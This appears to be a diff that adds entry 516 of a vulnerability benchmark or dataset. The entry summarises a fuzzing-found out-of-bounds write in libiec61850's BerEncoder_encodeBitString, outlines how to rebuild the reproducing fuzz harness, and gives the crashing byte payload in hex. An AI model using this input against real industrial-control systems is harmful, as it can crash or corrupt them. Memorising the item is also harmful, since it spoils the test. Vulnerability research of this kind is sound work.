@@ -1,0 +1,10 @@
+Number: 516
+
+Summarize:
+A fuzzing-discovered out-of-bounds write was reported in libiec61850 in `BerEncoder_encodeBitString` in `src/mms/asn1/ber_encoder.c`. The issue is triggered while encoding `MMS_BIT_STRING` `MmsData`: the function writes the tag, encoded length, padding byte, and bit-string bytes into `buffer` by advancing `bufPos`, but the report says it does not properly validate that `bufPos` stays within the valid buffer range. The report states this can occur if `bitStringSize` is large enough or if `bufPos` is already near the end of the buffer, resulting in writes past the end of `buffer`.
+
+Reproduce:
+No build flags or commands are provided in the report. The provided PoC is a fuzz-style harness linked against libiec61850 and using `iec61850_server.h`, `hal_thread.h`, and `lib_memory.h`. To reproduce, create `LLVMFuzzerTestOneInput(const char *data, size_t size)` that: (1) calls `MmsValue_decodeMmsData(data, 0, size, &out)`; (2) returns if decoding fails; (3) calls `MmsValue_encodeMmsData(mmsValue, NULL, 0, false)` to get `dataSize`; (4) allocates `dataSize` bytes with `GLOBAL_MALLOC`; (5) calls `MmsValue_encodeMmsData(mmsValue, mmsBuffer, 0, true)` to re-encode the value; and then (6) frees the buffer and deletes the `MmsValue`. Feed the harness the byte sequence provided in the report, beginning `"<84><81><80><00><30><30>..."` and continuing with repeated `<30>` bytes exactly as listed there. The report states that this input reaches `BerEncoder_encodeBitString` while encoding `MMS_BIT_STRING` data and triggers an out-of-bounds write. No specific crash log or sanitizer output is included.
+
+Payload:
+84 81 80 00 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30
